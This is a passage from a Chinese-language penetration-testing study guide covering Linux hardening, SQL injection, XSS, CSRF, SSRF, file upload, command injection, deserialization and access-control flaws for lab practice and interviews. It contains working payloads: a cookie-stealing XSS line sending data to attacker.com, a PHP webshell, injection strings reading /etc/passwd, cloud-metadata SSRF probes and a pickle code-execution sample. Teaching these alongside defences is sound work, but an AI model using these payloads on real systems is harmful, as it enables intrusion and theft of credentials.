- 答：抓包看有没有 TCP 重传/丢包（网络层问题），还是应用层没有响应/响应慢（应用问题）；重传多 = 链路不稳，RST 多 = 防火墙或服务异常
- 问：抓包发现 HTTP 明文密码，怎么防御？
- 答：上 HTTPS/TLS 加密传输；这是抓包最常见的"安全审计发现"

### 知识点 5：Linux 安全视角（SUID、shadow、日志审计）

**① 一句话本质**
你会的 Linux 命令换个"攻击者视角"来看，处处是攻击面——SUID 提权、shadow 密码文件、日志审计，这三点是入门安全必补的运维盲区。

**② 生活类比**
- SUID = 大楼里"员工卡能刷开领导办公室"的特殊门禁（权限升级入口）
- shadow = 存放所有住户"钥匙密码"的保险柜（被拿走全楼失守）
- 日志 = 大楼监控记录（出事时靠它还原现场）

**③ 原理详解**
- SUID/SGID 提权（渗透必考）
  - 普通文件执行时以"当前用户"身份运行
  - SUID 文件执行时以"文件属主"身份运行——如果 root 拥有的程序带 SUID 且可利用，就能以 root 执行
  - 查 SUID 文件：`find / -perm -4000 -type f 2>/dev/null`
  - 经典利用：`/usr/bin/find` 带 SUID 时可执行系统命令提权
- /etc/shadow 密码文件
  - 存放所有用户密码哈希，只有 root 可读
  - 密码格式：`用户名:$6$盐$哈希`（$6$ 是 SHA-512 算法标记）
  - 拿到 shadow = 拿到全系统密码哈希 → 离线爆破（John the Ripper）
  - 防御：强密码策略、禁止弱口令、定期换
- 日志审计
  - /var/log/auth.log（Debian/Ubuntu）或 /var/log/secure（CentOS/RHEL）：登录记录
  - /var/log/syslog、/var/log/messages：系统消息
  - last / lastb：登录历史 / 失败登录
  - 攻击特征：短时间内大量 Failed password = 暴力破解；凌晨异常登录成功 = 被入侵
- 安全基线要点：禁用 root 远程登录、SSH 密钥认证、最小权限、关闭无用服务、补丁管理

**④ 命令/代码示例**
```bash
# 找全系统 SUID 文件（提权攻击面）
find / -perm -4000 -type f 2>/dev/null

# 看登录记录（重点：失败登录和来源 IP）
last -20
sudo grep "Failed password" /var/log/auth.log | tail -20

# 看当前在线用户（异常多账号在线 = 被入侵）
who
w

# 检查用户账户（注意新出现的用户）
cat /etc/passwd | grep -v nologin
```

**⑤ 实战任务**
- 在靶机（DVWA 的 Linux 靶机或自己的测试机）跑 `find / -perm -4000` 找出 SUID 文件清单，研究 find/vim 等为什么带 SUID
- 用 `grep "Failed password"` 看自己机器有没有被爆破过，记录攻击者 IP
- 写一条 SSH 加固命令：禁用 root 登录 + 改默认端口

**⑥ 面试考点**
- 问：SUID 是什么？怎么利用提权？
- 答：SUID 让文件以属主身份执行；若 root 的 SUID 程序可被利用（如 find -exec、vim），就能执行任意命令拿 root
- 问：服务器被暴力破解 SSH 怎么办？
- 答：先改端口 + 禁 root 登录 + 密钥认证，再看 auth.log 找出爆破 IP 封禁，最后检查有没有登录成功的记录（可能已被入侵）

### 知识点 6：Python 网络编程（socket、requests）

**① 一句话本质**
Python 是安全工程师的"瑞士军刀"——socket 自己造轮子（端口扫描、反弹 shell、抓包脚本），requests 直接调 API（Web 请求、目录爆破、漏洞验证），没有现成工具时全靠它。

**② 生活类比**
socket = 自己亲手写信封、贴邮票、跑邮局（底层、可控、能造任何工具）；requests = 用快递 App 下单（封装好了，方便快）；安全攻防里"定制化"的场景必须自己造。

**③ 原理详解**
- socket 编程核心
  - 客户端：socket() 创建 → connect() 连接 → send/recv 收发 → close
  - 服务端：socket() → bind() 绑端口 → listen() 监听 → accept() 接受连接
  - 注意：TCP 面向连接、UDP 无连接（sendto/recvfrom）
- requests 库核心
  - get/post/put/delete 对应 HTTP 方法
  - 参数：headers（伪造 UA）、cookies、data/json（POST 体）、params（URL 参数）
  - 常见坑：SSL 证书验证（verify=False）、超时（timeout）、重定向（allow_redirects=False）
- 安全场景应用
  - 写端口扫描器（并发线程）
  - 写目录爆破（字典 + requests）
  - 写漏洞验证脚本（POC）
  - 反弹 shell（socket + 服务器端监听）

**④ 命令/代码示例**
端口扫描器（自包含、可直接运行）：
```python
# 简单的多线程 TCP 端口扫描器（仅用于授权环境/本机）
import socket
import threading
from concurrent.futures import ThreadPoolExecutor

def scan(ip, port):
    s = socket.socket()
    s.settimeout(0.5)
    try:
        s.connect((ip, port))
        print(f"[+] {ip}:{port} 开放")
    except Exception:
        pass
    finally:
        s.close()

ip = "127.0.0.1"
ports = [22, 80, 443, 3306, 6379, 8080, 3389]
with ThreadPoolExecutor(max_workers=20) as ex:
    ex.map(lambda p: scan(ip, p), ports)
```

用 requests 发送带伪造 UA 的请求：
```python
import requests

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
r = requests.get("http://example.com/login", headers=headers, timeout=5)
print(r.status_code, r.url)
```

**⑤ 实战任务**
- 把上面的端口扫描器跑起来，扫本机 127.0.0.1 的常用端口，验证结果和 nmap 一致
- 用 requests 写一个"目录爆破"脚本：对 http://127.0.0.1:8080/ 用字典（admin、login、backup、.git 等）探测哪些路径存在
- 写一个 TCP 服务端+客户端，实现"客户端发消息、服务端回显"（理解 socket 通信）

**⑥ 面试考点**
- 问：Python 在安全里主要用来干什么？
- 答：自动化——信息收集（扫描/爆破）、漏洞验证（POC）、数据处理（日志/流量解析）、写工具（抓包、反向 shell）
- 问：requests 和 socket 区别？
- 答：requests 是 HTTP 高层封装（方便），socket 是传输层底层接口（灵活可控）；渗透中 requests 做 Web 自动化，socket 做端口扫描、自定义协议、反弹 shell
- 问：爬虫和目录爆破会不会被反制？
- 答：会。目标可能限速、封 IP、上 WAF；所以工具要控速、轮换代理/UA，并且只在授权目标上使用

## 第二阶段：安全基础核心（密码学 + 认证授权 + Web 安全 + 系统安全）

### 知识点 1：密码学基础（对称 / 非对称 / 哈希 / TLS）

**① 一句话本质**
密码学就三样东西：加密（防偷看）、签名（防篡改+验身份）、哈希（验完整性）；对称加密快、非对称安全，HTTPS 用"非对称协商 + 对称传输"两者结合。

**② 生活类比**
- 对称加密 = 一把钥匙开一把锁，双方拿同一把钥匙（快，但钥匙怎么给是个问题）
- 非对称加密 = 一个锁配两把钥匙：公钥只能锁（加密），私钥才能开（解密）
- 哈希 = 指纹：内容变一点，指纹就完全不同，且无法从指纹还原内容

**③ 原理详解**
- 对称加密
  - 特点：加解密用同一把密钥，快
  - 代表算法：AES（现在的标准）、DES/3DES（过时）
  - 难点：密钥分发（怎么安全地把钥匙给对方）
- 非对称加密
  - 特点：公钥加密、私钥解密（或私钥签名、公钥验签），慢
  - 代表算法：RSA、ECC
  - 典型应用：HTTPS 握手、SSH 密钥登录
- 哈希（注意：哈希不是加密！）
  - 特点：单向（不可逆）、定长、雪崩效应（改一个字符整个变了）
  - 代表算法：MD5（可碰撞，已不安全）、SHA-1（已不推荐）、SHA-256（安全）
  - 用途：密码存储（加盐）、文件完整性校验、数字签名
  - 常见坑：密码明文存储、MD5 不加盐（撞库秒破）
- TLS/HTTPS 完整流程（一句话版）
  - 客户端说"我要安全连接" → 服务器出示证书（含公钥）
  - 客户端验证证书（是不是可信 CA 签的、域名对不对）
  - 客户端用服务器公钥加密一个"随机会话密钥"发给服务器
  - 之后双方用会话密钥（对称加密）通信，又快又安全

**④ 命令/代码示例**
```bash
# 哈希验证文件完整性
echo "hello" > a.txt
sha256sum a.txt          # 记下结果
echo "hello!" >> a.txt   # 改一点
sha256sum a.txt          # 结果完全不同（雪崩效应）

# 查看网站证书链（HTTPS 验证环节）
echo | openssl s_client -connect www.baidu.com:443 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates

# 密码加盐哈希（Python 一行）
python3 -c "import hashlib;print(hashlib.sha256('我的密码'.encode()+b'salt123').hexdigest())"
```

**⑤ 实战任务**
- 用 openssl 生成一对 RSA 密钥，用公钥加密文件、私钥解密，亲手体会非对称
- 用 sha256sum 验证你下载过的一个文件的完整性（很多官网提供 SHA256 校验值）
- 用 Python 实现"加盐哈希存密码"并验证"相同密码不同盐哈希不同"

**⑥ 面试考点**
- 问：对称和非对称的区别？什么时候用哪个？
- 答：对称快但密钥分发难，非对称慢但安全；HTTPS 用非对称做握手协商密钥、对称做数据传输；SSH 用非对称认证
- 问：密码存储为什么用加盐哈希而不是加密？
- 答：加密可逆（密钥泄露全泄露）；哈希单向不可逆，加盐防止相同密码的哈希相同、防彩虹表，密码库泄露也难以还原

### 知识点 2：认证与授权（Session / Cookie / JWT）

**① 一句话本质**
认证（Authentication）是"证明你是谁"（出示证件），授权（Authorization）是"你能干什么"（能进哪几个房间）；Session 是服务端记的账本，Cookie 是发给浏览器的凭证，JWT 是服务端签名过的自包含凭证。

**② 生活类比**
- 认证 = 进大楼刷工牌（你是谁）
- 授权 = 刷卡后能进几楼几室（你能干什么）
- Session = 前台登记簿：你登个记，前台给你个号牌，你每次来报号牌
- JWT = 一张防伪盖章的通行证：信息写在证上，验证时直接看证上的章（签名）真不真，不用翻前台登记簿

**③ 原理详解**
- 登录流程（认证）
  - 客户端提交账号密码 → 服务端校验 → 通过后创建会话 → 返回凭证
- Session + Cookie 机制
  - 服务端生成 Session ID（存服务端内存/Redis），通过 Set-Cookie 发给浏览器
  - 浏览器后续请求自动带 Cookie，服务端拿 Session ID 查账本
  - 缺点：服务端要存会话（集群要共享 session）
- JWT（Token）机制
  - 三段式：Header（算法）.Payload（用户信息）.Signature（签名）
  - 服务端不存状态，验签即可信（无状态、适合分布式）
  - 坑：Payload 只是 base64 编码，任何人可解码（不能放敏感信息）；密钥泄露 = 任意伪造
- 登录流程常见漏洞（必背）
  - 暴力破解：无限次试密码 → 防御验证码、限速、锁定
  - 会话固定：攻击者先拿一个 Session ID 骗你登录用 → 防御登录后换新 Session ID
  - 越权（水平/垂直）：改 ID 看别人数据 / 普通用户调用管理员接口 → 防御服务端校验权限（见知识点 10）
  - Cookie 安全问题：HttpOnly（防 XSS 偷 Cookie）、Secure（仅 HTTPS 传）、SameSite（防 CSRF）

**④ 命令/代码示例**
```bash
# 用 curl 模拟"登录 → 存 Cookie → 带 Cookie 访问"
curl -c cookies.txt -d "username=admin&password=123456" http://target/login
curl -b cookies.txt http://target/profile        # 带 Cookie 访问需要登录的页面

# 看 Cookie 属性（HttpOnly 是否设置，安全审计常用）
curl -v -X POST -d "u=a&p=b" http://target/login 2>&1 | grep -i set-cookie
```

**⑤ 实战任务**
- 在 DVWA 的 Login 页面，用 Burp Suite 观察登录成功后的 Set-Cookie 响应头
- 检查 DVWA 的 Cookie 有没有设置 HttpOnly/Secure/SameSite，说出每个属性防什么攻击
- 尝试：用 A 的 Cookie 换到 B 的会话（会话固定原理），在靶场体会为什么登录后要换 Session ID

**⑥ 面试考点**
- 问：Session 和 JWT 的区别？
- 答：Session 存服务端、可主动失效、集群要共享存储；JWT 无状态、适合分布式，但签发后难主动失效、Payload 不可存敏感信息
- 问：怎么防止暴力破解登录？
- 答：验证码、账号锁定（N 次失败锁 X 分钟）、限速、异常 IP 封禁、监控失败登录日志

### 知识点 3：SQL 注入（OWASP 常年第一）

**① 一句话本质**
SQL 注入 = 网站把用户输入"原样拼进" SQL 语句，攻击者输入恶意代码改变了 SQL 的语义，从而能查库、改库、甚至脱库。

**② 生活类比**
你填了一张取款单，银行把单子内容直接当成指令执行——你本应填"取 100 元"，却在单子上写了"取 100 元，并且把所有账户余额都打印给我"。填单（输入）没被校验，取款机（SQL）照单全收。

**③ 原理详解**
- 漏洞成因（代码层面）
  - 危险写法：字符串拼接 SQL（`SELECT * FROM users WHERE name='" + 输入 + "'"`）
  - 安全写法：参数化查询（`WHERE name=?`，占位符传参）
- 注入流程（手工注入标准步骤）
  - 找注入点：URL 参数、POST 参数、Cookie、请求头都可能
  - 判断注入：加 `'` 报错？加 `' and 1=1` 正常、`' and 1=2` 异常 → 存在
  - 判断列数：`' order by 3 -- -`（3 列正常、4 报错 → 共 3 列）
  - 联合查询：`' union select username,password,3 from users -- -`（直接把数据带出来）
  - 报错注入/布尔盲注/时间盲注：页面不显数据时的替代打法
- 危害等级（背）
  - 低：绕过登录、篡改数据
  - 高：脱库（拖走整库数据）、getshell（写 webshell 进服务器）
- 防御（背熟三条）
  - 参数化查询/预编译（根本解法）
  - 输入过滤与白名单（辅助）
  - 最小权限：数据库账号不给 DBA 权限、分离账号

**④ 命令/代码示例**
在 DVWA 靶场手工注入：
```sql
-- 1. 探测注入点（1' 报错说明被拼进 SQL）
-- 2. 判断列数
1' order by 2 -- -
-- 3. 联合查询脱库
1' union select user,password from users -- -
```

工具化验证（sqlmap，仅授权目标）：
```bash
sqlmap -u "http://target/vuln.php?id=1" --batch
sqlmap -u "http://target/vuln.php?id=1" --dbs            # 列库
sqlmap -u "http://target/vuln.php?id=1" -D dbname --tables  # 列表
```

**⑤ 实战任务**
- 在 sqli-labs 或 DVWA 靶场，手工完成一次完整的联合查询注入（探测→猜列→脱库）
- 用 sqlmap 对同一个靶场跑一遍，对比工具和手工的结果
- 代码层面：写一段"参数化查询 vs 拼接 SQL"的对比代码（PHP/Java/Python 任选），体会为什么参数化能防注入

**⑥ 面试考点**
- 问：SQL 注入的原理和防御？
- 答：原理是输入被拼接进 SQL 改变语义；防御是参数化查询（根本）、过滤白名单、最小权限；联合查询/盲注是常见打法
- 问：页面不显示数据怎么注（盲注）？
- 答：布尔盲注（and 1=1/1=2 判断）、时间盲注（sleep() 判断）、报错注入（extractvalue/updatexml）
- 问：为什么参数化查询能防注入？
- 答：参数和 SQL 结构分离，输入只当"数据"处理，不当"代码"执行

### 知识点 4：XSS（跨站脚本攻击）

**① 一句话本质**
XSS = 攻击者把恶意 JS 代码"存进/塞进"页面，其他用户打开页面时浏览器执行了这段代码，等于攻击者借用户的浏览器干坏事。

**② 生活类比**
你在楼下贴了张海报，结果海报里藏了个机关——每个来看海报的人都被机关偷拍了。海报（页面内容）是别人能看的，机关（恶意脚本）藏在里面一起被看。

**③ 原理详解**
- 三种类型（必背）
  - 反射型：恶意代码在 URL 里，点链接触发，一次性的（不持久）
  - 存储型：恶意代码存进服务器数据库，所有看页面的人都中招（最危险，评论区/留言板是重灾区）
  - DOM 型：前端 JS 自己把不可信数据写进页面，纯前端问题
- 能干什么（危害）
  - 偷 Cookie（配合 HttpOnly 缺失 → 会话劫持直接登录受害者账号）
  - 钓鱼：伪造登录框骗密码
  - 键盘记录、CSRF 配合、挖矿脚本、蠕虫传播
- 防御（三条主线）
  - 输出转义（对 `<script>` 等特殊字符编码）——最根本
  - CSP（Content-Security-Policy）：限制页面能加载/执行哪些脚本
  - HttpOnly Cookie：让 JS 读不到 Cookie，配合兜底
  - 输入过滤（辅助，不治本）

**④ 命令/代码示例**
反射型 XSS 测试（靶场）：
```html
<!-- 在 URL 参数里注入（靶场环境） -->
http://target/search.php?kw=<script>alert(document.cookie)</script>

<!-- 偷 Cookie 的 payload（攻击者服务器收数据） -->
<script>new Image().src='http://attacker.com/c?c='+document.cookie</script>
```

**⑤ 实战任务**
- 在 DVWA 反射型 XSS 里跑通 `alert(1)`，再换成偷 Cookie 的 payload
- 在存储型 XSS（留言板）里提交恶意脚本，用另一个浏览器打开页面验证"所有人都中招"
- 用 Burp Suite 观察：注入后响应里 `<script>` 是否原样回显（是 → 存在 XSS）

**⑥ 面试考点**
- 问：反射型、存储型、DOM 型 XSS 的区别？
- 答：反射一次性不持久（URL 触发）、存储入库所有人中招（最危险）、DOM 型纯前端由 JS 写入
- 问：XSS 能偷到带 HttpOnly 的 Cookie 吗？
- 答：不能，HttpOnly 就是防 JS 读 Cookie；但 XSS 仍可做钓鱼、键盘记录等，所以 HttpOnly 只是缓解不是根治
- 问：怎么防御 XSS？
- 答：输出转义（根本）+ CSP 限制 + HttpOnly + 输入过滤辅助

### 知识点 5：CSRF（跨站请求伪造）

**① 一句话本质**
CSRF = 攻击者让受害者"替自己发请求"——受害者已登录某网站，攻击者诱导他点了个链接，浏览器自动带上受害者的 Cookie，网站以为是本人操作。

**② 生活类比**
你已经登录了银行 App（浏览器带着你的会话），这时有人发你一个链接"点击领红包"，实际是"向某账户转账"的请求——你的浏览器自动带着你的登录凭证执行了它，银行以为是你在操作。

**③ 原理详解**
- 攻击成立的条件（三个缺一不可）
  - 受害者已登录目标网站（浏览器存着有效 Cookie）
  - 目标网站的敏感操作只用 Cookie 验证（没有额外校验）
  - 攻击者能让受害者访问恶意页面（发链接/钓鱼）
- 典型场景
  - 改密码、转账、改邮箱、发帖、删数据等"有副作用"的操作
  - GET 型：恶意 `<img src="http://bank/transfer?to=evil&amt=1000">` 图片一加载就触发
  - POST 型：恶意表单自动提交
- 与 XSS 的关系：XSS 是"往页面塞代码"，CSRF 是"诱导发请求"；XSS 能绕过很多 CSRF 防御，二者常配合
- 防御（背熟）
  - CSRF Token：表单里带随机 token，服务端校验（主流方案）
  - SameSite Cookie：浏览器限制跨站请求带 Cookie
  - 敏感操作二次验证：输密码/验证码
  - 检查 Referer（辅助，可被绕过）

**④ 命令/代码示例**
CSRF 攻击页（靶场演示用）：
```html
<!-- 受害者打开这个页面，会自动向已登录的目标站发转账请求 -->
<html>
<body>
<form method="POST" action="http://target/change_pwd.php">
  <input type="hidden" name="newpwd" value="hacked123">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

**⑤ 实战任务**
- 在 DVWA 的 CSRF 模块，先正常改密码（看有没有 Token），再构造上面的自动提交页体验"一键中招"
- 观察 DVWA 加 Token 后的表单，对比有 Token 和没 Token 时的请求，说出防御原理

**⑥ 面试考点**
- 问：CSRF 和 XSS 的区别？
- 答：XSS 是注入脚本到页面（利用信任的网站），CSRF 是诱导用户发请求（利用信任的浏览器）；XSS 更难防且可绕过 CSRF
- 问：怎么防御 CSRF？
- 答：CSRF Token（主流）+ SameSite Cookie + 敏感操作二次验证
- 问：攻击者怎么让受害者访问恶意页面？
- 答：钓鱼链接、论坛发帖、聊天消息、图片标签（GET 型用 `<img>` 无感触发）

### 知识点 6：SSRF（服务端请求伪造）

**① 一句话本质**
SSRF = 服务端把"用户提供的 URL"当请求目标去访问——攻击者让它去访问"内网/本机/云元数据"等本不该暴露的地址，借服务器当跳板。

**② 生活类比**
你让前台帮你"打印一份网页"，前台很听话地把你给的地址都打了一遍——包括"自己公司的内部档案室地址"。前台（服务器）能访问内网，你（攻击者）借它的手去摸内网。

**③ 原理详解**
- 漏洞成因
  - 功能需要"取远程资源"：图片加载、URL 预览、Webhook 回调、PDF 生成、文件导入导出
  - 代码直接 `file_get_contents($_GET['url'])` / `requests.get(用户输入)` 不校验
- 能干什么（危害）
  - 扫内网端口：让服务器访问 `http://192.168.1.1:3306` 探测内网服务
  - 读本机文件：`file:///etc/passwd`
  - 打云元数据：访问 `http://169.254.169.254/latest/meta-data/`（阿里云/ AWS 云服务器凭据，高危）
  - 内网穿透：访问内网 Redis/MySQL 等未授权服务
- 防御
  - 白名单：只允许访问指定的域名/URL 前缀
  - 禁止内网地址段：过滤 127.0.0.1、10.x、172.16-31.x、192.168.x、169.254.169.254
  - 协议限制：只允许 http/https，禁止 file/gopher 等
  - DNS 重绑定攻击提醒：校验域名后要再校验解析出的 IP

**④ 命令/代码示例**
靶场验证 SSRF 的三个经典地址：
```
# 1. 读本机文件（协议攻击）
url=file:///etc/passwd

# 2. 扫本机端口（内网探测）
url=http://127.0.0.1:3306

# 3. 云元数据（云服务器凭据，演示勿在生产环境）
url=http://169.254.169.254/latest/meta-data/
```

**⑤ 实战任务**
- 在靶场（如 pikachu 的 SSRF 模块）用 `file://` 读 /etc/passwd，用 `http://127.0.0.1:8080` 探测内网
- 设计一份"URL 白名单 + 内网 IP 拦截"的修复方案（写代码思路或伪代码）

**⑥ 面试考点**
- 问：SSRF 怎么利用？
- 答：读本地文件（file://）、扫内网端口、打云元数据拿凭据、访问内网未授权服务
- 问：怎么防御 SSRF？
- 答：URL 白名单 + 禁内网 IP 段 + 限制协议（禁 file/gopher）+ 校验解析后 IP（防 DNS 重绑定）

### 知识点 7：文件上传漏洞

**① 一句话本质**
文件上传漏洞 = 网站允许你上传文件，但没严格校验内容——攻击者上传一个"网页木马"（webshell），从而直接在服务器上执行命令。

**② 生活类比**
物业允许你往储物间放东西，但只查了箱子外面贴的标签（后缀名），没查里面装什么——你塞了一根"能开所有房门的万能钥匙"进去。标签可以造假，内容才是关键。

**③ 原理详解**
- 漏洞成因
  - 只校验后缀名（可绕过）、只校验 Content-Type（可抓包改）、只校验前端 JS（可绕过）
  - 上传目录可执行脚本（php 文件被当代码执行）
- 攻击流程
  - 上传 webshell（如 `shell.php`，内容是 `<?php system($_GET['cmd']);?>`）
  - 访问上传的文件 → 服务器执行 → 获得命令执行能力（getshell）
  - 配合提权、内网渗透，一台服务器沦陷
- 常见绕过手法（背几个）
  - 改后缀大小写：`.pHp`、`.php5`、`.phtml`
  - 双写后缀：`shell.php.jpg`（中间件解析漏洞）
  - 改 Content-Type 为 `image/jpeg`
  - 图片马：图片内容里塞 PHP 代码，配合文件包含漏洞执行
  - 空字节截断（老版本）：`shell.php%00.jpg`
- 防御（背熟）
  - 白名单后缀（只允许图片等）+ 随机文件名（重命名，防路径可预测）
  - 校验文件内容（文件头魔数，如 JPEG 以 FFD8FF 开头）
  - 上传目录禁止脚本执行（Nginx/Apache 配置）
  - 存储与执行分离（文件放 OSS/CDN，应用服务器不落地）

**④ 命令/代码示例**
一句话 webshell（靶场测试，仅授权环境）：
```php
<?php system($_GET['cmd']); ?>
```

图片马制作（给文件包含配合用）：
```bash
# 在图片末尾追加 PHP 代码（文件包含漏洞会解析它）
cp normal.jpg shell.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
```

**⑤ 实战任务**
- 在 DVWA 文件上传模块，依次尝试：直接传 php → 改大小写 → 改 Content-Type → 双后缀，记录每次结果
- 用上传的 webshell 执行 `id`、`whoami`，体会"命令执行"的危害

**⑥ 面试考点**
- 问：文件上传怎么绕过？
- 答：改后缀大小写/双写、改 Content-Type、图片马、%00 截断（老版本）、配合解析漏洞
- 问：怎么防御文件上传？
- 答：白名单后缀 + 内容校验（魔数）+ 随机文件名 + 上传目录禁执行 + 存储执行分离

### 知识点 8：命令注入（RCE 入门）

**① 一句话本质**
命令注入 = 网站把用户输入拼进系统命令（shell）执行，输入里的 `;`、`&&`、`|` 等特殊符号改变了命令语义，让服务器执行了攻击者的命令。

**② 生活类比**
你让助手"把文件按名字排序，然后打印"，结果助手把你说的话直接当命令念了出来——你在文件名里混入的"顺便删掉所有文件"，它也照做了。

**③ 原理详解**
- 成因（与 SQL 注入同源的"拼接"问题，但目标是系统命令）
  - 典型函数：PHP `system()`/`exec()`/`shell_exec()`、Python `os.system()`/`subprocess`（shell=True）、Java `Runtime.exec()`
  - 危险写法：`system("ping -c 3 " . $_GET['ip'])`
- 常用注入符号（背熟）
  - `;` 命令分隔：`127.0.0.1;id`
  - `&&` / `||`：前命令成功/失败后执行后命令
  - `|` 管道：`127.0.0.1 | id`
  - 反引号/`$()`：`$(id)`、`` `id` ``
- 危害：直接执行系统命令（RCE 远程代码执行）→ 提权 → 控制整台服务器
- 防御
  - 永远不要拼命令：用参数数组方式调用（`exec` 不经过 shell）
  - 输入白名单校验（如 IP 用正则校验）
  - 最小权限：Web 进程不用 root

**④ 命令/代码示例**
靶场测试：
```bash
# 正常：ping 一个 IP
http://target/ping.php?ip=127.0.0.1

# 注入：拼一个命令（看到输出即存在命令注入）
http://target/ping.php?ip=127.0.0.1;id
http://target/ping.php?ip=127.0.0.1|whoami
http://target/ping.php?ip=$(cat /etc/passwd)
```

**⑤ 实战任务**
- 在 DVWA 命令注入模块，用 `;`、`|`、`$(...)` 三种方式各执行一次命令，观察回显
- 尝试反弹 shell（在授权的本地靶场，自己机器监听 `nc -lvnp 4444`，目标执行反弹命令）

**⑥ 面试考点**
- 问：命令注入和代码执行的区别？
- 答：命令注入是拼接进系统命令（shell），代码执行是执行程序代码（如 eval）；都属于 RCE，都是高危
- 问：怎么防命令注入？
- 答：不拼命令（参数数组传参）、白名单校验、最小权限、禁用危险函数

### 知识点 9：反序列化漏洞

**① 一句话本质**
反序列化 = 把"存起来的对象数据"还原成内存对象的过程；如果反序列化的数据来自用户且没做限制，攻击者可以构造恶意数据，让程序在执行过程中"顺便执行恶意代码"。

**② 生活类比**
程序把对象"打包成快递单"存起来（序列化），下次"照着快递单把东西组装回来"（反序列化）。如果快递单是别人伪造的，上面写着"组装时顺便执行一个炸弹"，程序照单组装就炸了。

**③ 原理详解**
- 序列化/反序列化是什么
  - 序列化：对象 → 字符串/字节（存库、缓存、传输）
  - 反序列化：字符串/字节 → 对象（读取时）
  - 常见格式：PHP serialize、Java ObjectInputStream、Python pickle、JSON（相对安全）
- 漏洞成因
  - 反序列化的输入来自用户（Cookie、参数、请求体）且未校验
  - 代码执行链：反序列化过程中调用对象的方法（__destruct/__wakeup/readObject 等魔术方法），攻击者控制对象的属性和类 → 触发危险方法链（POP 链）
  - 需要"可利用的类"（gadget）：常见组件（Fastjson、Log4j、commons-collections、shiro）自带可利用链
- 危害：RCE（远程代码执行）、反序列化 → getshell
- 经典案例
  - Java Fastjson 反序列化 RCE（2017 爆出）
  - Log4j2 漏洞（JNDI 注入，2021 年史诗级）
  - PHP unserialize、Python pickle、shiro 反序列化
- 防御
  - 不要反序列化不可信数据（最根本）
  - 白名单类限制（允许反序列化的类）
  - 升级组件版本（修复已知 gadget 链）

**④ 命令/代码示例**
Python pickle 风险演示（仅理解原理）：
```python
# 危险：反序列化不可信数据会执行代码
import pickle, os

class Evil:
    def __reduce__(self):
        return (os.system, ("id",))   # 反序列化时执行 id

payload = pickle.dumps(Evil())
# 攻击者发送 payload，服务端 pickle.loads(payload) 即执行命令
print(payload)
```

**⑤ 实战任务**
- 写一段 Python 代码：序列化一个普通对象 → 反序列化还原，理解正常流程
- 再写一个含 `__reduce__` 的恶意对象，模拟"反序列化执行命令"，体会为什么不可信数据不能反序列化
- 搜索"Fastjson 1.2.24"漏洞原理文章，用自己的话说出利用链

**⑥ 面试考点**
- 问：反序列化漏洞是怎么造成 RCE 的？
- 答：不可信数据被反序列化时触发对象的魔术方法，配合可利用的类（gadget）形成调用链执行任意代码
- 问：怎么防御反序列化？
- 答：不反序列化不可信数据、类白名单、升级组件版本

### 知识点 10：越权漏洞（水平 / 垂直）

**① 一句话本质**
越权 = 服务端没有校验"这个操作是不是当前用户该干的"——水平越权是"看别人的数据"（改 ID 就行），垂直越权是"普通用户干管理员的事"（直接调管理接口）。

**② 生活类比**
- 水平越权：你在银行取号，把号牌改成别人的号，就能查别人的账户——系统只认"号牌"（ID），不认"你是谁"
- 垂直越权：普通员工拿张"访客卡"进了 CEO 办公室——系统只认"卡能刷开"（接口没限权限），不认岗位

**③ 原理详解**
- 水平越权（IDOR：不安全的直接对象引用）
  - 典型场景：`/profile?user_id=100`，把 100 改成 101 就能看别人资料
  - 本质：只校验"有没有登录"，没校验"是不是本人/有权限"
  - 常见于：订单查询、个人信息、文件下载、私信
- 垂直越权
  - 普通用户直接访问管理接口：`/admin/delete_user.php`
  - 本质：接口只校验登录，没校验角色/权限
- 为什么难防：功能逻辑在每个接口都要做权限判断，容易漏
- 防御
  - 服务端统一鉴权中间件：接口级权限校验（RBAC 角色权限模型）
  - 数据级校验：查询数据时强制带"当前用户 ID"条件（`WHERE user_id = 当前登录人`）
  - 不要信任前端传的 ID：从 Session 取当前用户
  - 越权测试是渗透必测项（改 ID 逐个试）

**④ 命令/代码示例**
测试手法（靶场）：
```bash
# 水平越权测试：改 ID 看别人数据
curl -b "session=xxxx" "http://target/profile?user_id=101"
curl -b "session=xxxx" "http://target/profile?user_id=102"

# 垂直越权测试：普通用户直接访问管理接口
curl -b "session=xxxx" "http://target/admin/users.php"
```

**⑤ 实战任务**
- 在靶场找一个"查看详情"功能（如 pikachu 的越权模块），登录 A 后用 A 的会话访问 B 的 ID，验证水平越权
- 找靶场的管理功能，用普通用户会话直接访问，验证垂直越权
- 写一段修复代码思路：从 Session 取当前用户 + 查询强制带用户条件

**⑥ 面试考点**
- 问：水平越权和垂直越权的区别？
- 答：水平是同级别间的横向越权（改 ID 看他人数据），垂直是低权限访问高权限功能（普通用户调管理接口）
- 问：怎么防越权？
- 答：服务端统一鉴权（RBAC）+ 数据查询强制绑定当前用户 + 不信任前端传的 ID（从 Session 取）

### 知识点 11：系统安全（权限模型 / 提权原理 / 安全基线）

**① 一句话本质**
系统安全 = 懂"权限边界"在哪（谁能干什么）——Linux 靠用户组/文件权限，漏洞利用后的"提权"就是跨这条边界；加固就是把这个边界收紧。

**② 生活类比**
大楼的门禁系统：普通员工卡能进工位（普通权限），管理员卡能进机房（root）。入侵者拿到员工卡后，所有努力都是为了让这张卡"升级成管理员卡"——这就是提权。

**③ 原理详解**
- Linux 权限模型
  - 三组权限：属主（u）/属组（g）/其他（o），每种读（r=4）写（w=2）执行（x=1）
  - 特殊权限：SUID（4000）、SGID（2000）、Sticky（1000，/tmp 用）
  - root 是超级权限，一切皆可；普通用户受限
  - sudo 机制：给普通用户"临时提权"到指定命令
- 提权原理（渗透核心）
  - 为什么能提权：Web 服务/应用以高权限运行（root）、内核有漏洞、配置有错误
  - Linux 提权方向
    - SUID 提权：root 所有的 SUID 文件可利用
    - sudo 配置错误：`sudo -l` 看到可免密执行的命令
    - 内核漏洞：脏牛（Dirty Cow）等
    - 计划任务：可写的脚本被 root 定时执行
    - 弱口令：切到高权限用户
  - Windows 提权方向
    - 内核漏洞（Potato 系列、MS17-010）、服务路径错误、AlwaysInstallElevated
- 安全基线（加固清单，运维的活）
  - 账号：禁用 root 远程登录、删除无用账号、密码策略
  - 服务：最小化安装、关闭无用端口/服务
  - 权限：最小权限、配置文件属主
  - 更新：及时打补丁（内核/中间件/应用）
  - 日志：开启审计、日志集中

**④ 命令/代码示例**
加固清单（直接可执行的核心项）：
```bash
# 1. 禁用 root SSH 登录 + 只留密钥认证
